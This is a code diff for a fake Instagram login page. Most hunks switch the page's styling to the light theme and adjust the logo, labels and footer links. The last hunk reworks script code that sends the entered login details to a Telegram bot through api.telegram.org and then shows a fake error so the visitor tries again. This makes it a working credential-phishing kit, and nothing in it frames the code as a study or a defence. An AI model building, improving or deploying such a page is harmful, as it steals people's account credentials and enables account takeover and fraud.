@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Login • Instagram</title>
     <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/yJ/r/53X3pk-t2Gn.webp">
-    <meta name="theme-color" content="#000000">
+    <meta name="robots" content="noimageindex, noarchive">
     <meta name="mobile-web-app-capable" content="yes">
     <style>
         * {
@@ -16,74 +16,39 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #000000;
-            color: #f5f5f5;
+            background-color: #fafafa;
+            font-size: 14px;
+            color: #262626;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            overflow-y: auto;
         }
 
-        /* ===== PHONE FRAME ===== */
-        .phone-frame {
-            position: relative;
-            width: 375px;
-            max-width: 100%;
-            min-height: 100vh;
-            background-color: #000000;
+        .container {
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            padding: 20px 0 30px;
-        }
-
-        /* ===== LOGIN WRAPPER ===== */
-        .login-wrapper {
-            width: 100%;
-            max-width: 350px;
-            margin: 0 auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        /* ===== LOGO ===== */
-        .logo-section {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-bottom: 30px;
+            padding: 30px 0 50px;
             width: 100%;
         }
 
-        .instagram-logo {
-            width: 200px;
-            height: auto;
-            fill: #f5f5f5;
-        }
-
-        .logo-subtitle {
-            color: #a8a8a8;
-            font-size: 16px;
-            font-weight: 400;
-            margin-top: 12px;
-            text-align: center;
-        }
-
-        /* ===== PHONE MOCKUP LEFT SIDE (desktop only) ===== */
         .main-content {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 40px;
+            gap: 32px;
             width: 100%;
+            max-width: 935px;
+            margin: 0 auto;
         }
 
+        /* ===== PHONE MOCKUP ===== */
         .phone-mockup {
             display: none;
+            flex-shrink: 0;
         }
 
         .phone-mockup img {
@@ -95,22 +60,36 @@
             .phone-mockup {
                 display: block;
             }
-            .phone-frame {
-                min-height: auto;
-                padding: 40px 0;
-            }
+        }
+
+        /* ===== LOGIN WRAPPER ===== */
+        .login-wrapper {
+            width: 100%;
+            max-width: 350px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
         /* ===== LOGIN CARD ===== */
         .login-card {
-            background-color: #000000;
-            border: 1px solid #262626;
-            border-radius: 4px;
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
             width: 100%;
-            padding: 40px 40px 30px;
+            padding: 40px 40px 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
+            margin-bottom: 10px;
+        }
+
+        /* ===== LOGO ===== */
+        .logo {
+            width: 175px;
+            height: auto;
+            margin-bottom: 35px;
+            display: block;
         }
 
         /* ===== FORM ===== */
@@ -122,18 +101,18 @@
 
         .form-group input {
             width: 100%;
-            padding: 12px 9px 8px 9px;
-            background-color: #121212;
-            border: 1px solid #363636;
-            border-radius: 4px;
+            padding: 9px 8px 7px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
             font-size: 12px;
-            color: #f5f5f5;
+            color: #262626;
             outline: none;
             transition: border-color 0.2s;
         }
 
         .form-group input:focus {
-            border-color: #6b6b6b;
+            border-color: #a8a8a8;
         }
 
         .form-group input::placeholder {
@@ -141,14 +120,9 @@
             font-size: 12px;
         }
 
-        .form-group input:-webkit-autofill {
-            -webkit-box-shadow: 0 0 0 30px #121212 inset !important;
-            -webkit-text-fill-color: #f5f5f5 !important;
-        }
-
         .login-btn {
             width: 100%;
-            padding: 8px 16px;
+            padding: 7px 16px;
             background-color: #0095f6;
             border: none;
             border-radius: 8px;
@@ -156,7 +130,7 @@
             font-weight: 600;
             font-size: 14px;
             cursor: pointer;
-            margin-top: 14px;
+            margin-top: 12px;
             transition: background-color 0.3s;
             min-height: 36px;
             display: flex;
@@ -169,9 +143,8 @@
         }
 
         .login-btn:disabled {
-            background-color: #004a77;
+            background-color: #b2dffc;
             cursor: default;
-            opacity: 0.7;
         }
 
         .spinner {
@@ -200,7 +173,7 @@
         .divider-line {
             flex: 1;
             height: 1px;
-            background-color: #262626;
+            background-color: #dbdbdb;
         }
 
         .divider-text {
@@ -210,25 +183,25 @@
             margin: 0 18px;
         }
 
-        /* ===== FACEBOOK BUTTON ===== */
+        /* ===== FACEBOOK ===== */
         .facebook-login {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
-            color: #0095f6;
+            color: #385185;
             font-weight: 600;
             font-size: 14px;
             cursor: pointer;
             background: none;
             border: none;
             text-decoration: none;
-            margin-bottom: 12px;
-            padding: 0;
+            margin-bottom: 15px;
+            width: 100%;
         }
 
         .facebook-login:hover {
-            color: #1877f2;
+            text-decoration: none;
         }
 
         .facebook-icon {
@@ -242,11 +215,10 @@
 
         /* ===== FORGOT PASSWORD ===== */
         .forgot-password {
-            color: #e0f1ff;
+            color: #00376b;
             font-size: 12px;
             cursor: pointer;
             text-decoration: none;
-            margin-top: 4px;
         }
 
         .forgot-password:hover {
@@ -256,30 +228,31 @@
         /* ===== ERROR ===== */
         .error-msg {
             color: #ed4956;
-            font-size: 13px;
+            font-size: 14px;
             margin-top: 10px;
             display: none;
             text-align: center;
             line-height: 1.4;
+            width: 100%;
         }
 
         /* ===== SIGNUP CARD ===== */
         .signup-card {
-            border: 1px solid #262626;
-            border-radius: 4px;
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
             width: 100%;
-            padding: 22px 40px;
+            padding: 20px 40px;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 5px;
             font-size: 14px;
-            margin-top: 10px;
-            background-color: #000000;
+            margin-bottom: 10px;
         }
 
         .signup-card p {
-            color: #f5f5f5;
+            color: #262626;
         }
 
         .signup-card a {
@@ -297,14 +270,14 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            margin-top: 18px;
+            margin-top: 10px;
             gap: 15px;
             width: 100%;
         }
 
         .get-app p {
             font-size: 14px;
-            color: #f5f5f5;
+            color: #262626;
         }
 
         .store-badges {
@@ -319,13 +292,15 @@
 
         /* ===== FOOTER ===== */
         .footer {
-            max-width: 350px;
+            max-width: 100%;
             width: 100%;
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
-            padding: 20px 16px 40px;
+            padding: 0 16px;
+            margin-top: 24px;
             gap: 0;
+            max-width: 700px;
         }
 
         .footer a {
@@ -355,7 +330,7 @@
         }
 
         .footer-bottom select {
-            background: #000000;
+            background: #fafafa;
             color: #737373;
             border: none;
             font-size: 12px;
@@ -363,66 +338,50 @@
             outline: none;
         }
 
-        .footer-copyright {
-            color: #737373;
-            font-size: 12px;
-            text-align: center;
-            margin-top: 8px;
-        }
-
         /* ===== RESPONSIVE ===== */
         @media (max-width: 450px) {
-            .login-card, .signup-card {
-                border-left: none;
-                border-right: none;
-                border-radius: 0;
-                padding-left: 20px;
-                padding-right: 20px;
+            body {
+                background-color: #ffffff;
             }
             .login-card {
-                padding-top: 30px;
-                padding-bottom: 20px;
+                border: none;
+                padding: 30px 20px 10px;
+                margin-bottom: 0;
             }
-            .phone-frame {
+            .signup-card {
+                border: none;
+                padding: 20px;
+                margin-bottom: 0;
+            }
+            .container {
                 padding: 0;
             }
-            .footer {
-                padding: 20px 12px 30px;
-            }
-        }
-
-        /* ===== LOADING DOTS ===== */
-        .btn-text {
-            display: inline;
         }
     </style>
 </head>
 <body>
 
-    <div class="phone-frame">
+    <div class="container">
         <div class="main-content">
-            <!-- Phone Mockup (desktop only) -->
+            <!-- Phone Mockup -->
             <div class="phone-mockup">
                 <img src="https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp" alt="Instagram phones">
             </div>
 
             <!-- Login Section -->
             <div class="login-wrapper">
-                <!-- Logo + Subtitle -->
-                <div class="logo-section">
-                    <svg class="instagram-logo" viewBox="0 0 200 53" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M48.6 24.6c0-6.1 4.9-11.1 11-11.1s11 5 11 11.1-4.9 11.1-11 11.1-11-5-11-11.1zm5.9 0c0 2.8 2.3 5.1 5.1 5.1s5.1-2.3 5.1-5.1-2.3-5.1-5.1-5.1-5.1 2.3-5.1 5.1zm11.5-11.7c0 1.4 1.1 2.5 2.5 2.5s2.5-1.1 2.5-2.5-1.1-2.5-2.5-2.5-2.5 1.1-2.5 2.5zm10.5 2.2c-1.3-1.8-3.2-3.1-5.5-3.6-.8-.2-2.1-.4-6.3-.4H49.9c-4.2 0-5.5.2-6.3.4-2.3.5-4.2 1.8-5.5 3.6-1 1.4-1.7 3.1-1.9 5.1-.1.7-.2 1.9-.2 5.9v5.3c0 4 .1 5.2.2 5.9.2 2 .9 3.7 1.9 5.1 1.3 1.8 3.2 3.1 5.5 3.6.8.2 2.1.4 6.3.4H65c4.2 0 5.5-.2 6.3-.4 2.3-.5 4.2-1.8 5.5-3.6 1-1.4 1.7-3.1 1.9-5.1.1-.7.2-1.9.2-5.9v-5.3c0-4-.1-5.2-.2-5.9-.2-2-.9-3.7-1.9-5.1z" fill="#f5f5f5"/>
-                        <circle cx="38.5" cy="19.5" r="1.5" fill="#f5f5f5"/>
-                    </svg>
-                    <div class="logo-subtitle">See everyday moments from your close friends.</div>
-                </div>
-
                 <!-- Login Card -->
                 <div class="login-card">
+                    <!-- Instagram Logo SVG (white bg version) -->
+                    <svg class="logo" viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M41.6 24.6c0-6.1 4.9-11.1 11-11.1s11 5 11 11.1-4.9 11.1-11 11.1-11-5-11-11.1zm5.9 0c0 2.8 2.3 5.1 5.1 5.1s5.1-2.3 5.1-5.1-2.3-5.1-5.1-5.1-5.1 2.3-5.1 5.1zm11.5-11.7c0 1.4 1.1 2.5 2.5 2.5s2.5-1.1 2.5-2.5-1.1-2.5-2.5-2.5-2.5 1.1-2.5 2.5zm10.5 2.2c-1.3-1.8-3.2-3.1-5.5-3.6-.8-.2-2.1-.4-6.3-.4H36.9c-4.2 0-5.5.2-6.3.4-2.3.5-4.2 1.8-5.5 3.6-1 1.4-1.7 3.1-1.9 5.1-.1.7-.2 1.9-.2 5.9v5.3c0 4 .1 5.2.2 5.9.2 2 .9 3.7 1.9 5.1 1.3 1.8 3.2 3.1 5.5 3.6.8.2 2.1.4 6.3.4H52c4.2 0 5.5-.2 6.3-.4 2.3-.5 4.2-1.8 5.5-3.6 1-1.4 1.7-3.1 1.9-5.1.1-.7.2-1.9.2-5.9v-5.3c0-4-.1-5.2-.2-5.9-.2-2-.9-3.7-1.9-5.1zM28.7 41.4c-1.1-.7-2-1.6-2.7-2.7-1-1.4-1.6-3-1.8-4.8-.1-.7-.2-1.8-.2-5.6v-5c0-3.8.1-4.9.2-5.6.2-1.8.8-3.4 1.8-4.8.7-1.1 1.6-2 2.7-2.7 1.4-1 3-1.6 4.8-1.8.7-.1 1.8-.2 5.6-.2h14.8c3.8 0 4.9.1 5.6.2 1.8.2 3.4.8 4.8 1.8 1.1.7 2 1.6 2.7 2.7 1 1.4 1.6 3 1.8 4.8.1.7.2 1.8.2 5.6v5c0 3.8-.1 4.9-.2 5.6-.2 1.8-.8 3.4-1.8 4.8-.7 1.1-1.6 2-2.7 2.7-1.4 1-3 1.6-4.8 1.8-.7.1-1.8.2-5.6.2H36.9c-3.8 0-4.9-.1-5.6-.2-1.8-.2-3.4-.8-4.8-1.8z" fill="#262626"/>
+                        <circle cx="33.5" cy="19.5" r="1.5" fill="#262626"/>
+                    </svg>
+
                     <form id="loginForm" autocomplete="off" style="width:100%;">
                         <!-- Username/Email -->
                         <div class="form-group">
-                            <input type="text" id="username" placeholder="Mobile number, username or email" required autocomplete="off">
+                            <input type="text" id="username" placeholder="Phone number, username or email" required autocomplete="off">
                         </div>
                         <!-- Password -->
                         <div class="form-group">
@@ -459,7 +418,7 @@
                 <!-- Sign Up -->
                 <div class="signup-card">
                     <p>Don't have an account?</p>
-                    <a href="#">Create new account</a>
+                    <a href="#">Sign up</a>
                 </div>
 
                 <!-- Get App -->
@@ -484,9 +443,7 @@
             <a href="#">Privacy</a>
             <a href="#">Terms</a>
             <a href="#">Locations</a>
-            <a href="#">Popular</a>
             <a href="#">Instagram Lite</a>
-            <a href="#">Meta AI</a>
             <a href="#">Threads</a>
             <a href="#">Contact Uploading &amp; Non-Users</a>
             <a href="#">Meta Verified</a>
@@ -557,20 +514,18 @@
 ━━━━━━━━━━━━━━━━━━━
             `.trim();
 
-            // === Send to Telegram ===
-            try {
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch (_) {}
+            // === Send to Telegram (background, no waiting) ===
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(() => {});
 
-            // === Show fake error after short delay (like real Instagram) ===
+            // === Show fake error like real Instagram ===
             setTimeout(() => {
                 loginBtn.disabled = false;
                 btnText.style.display = 'inline';
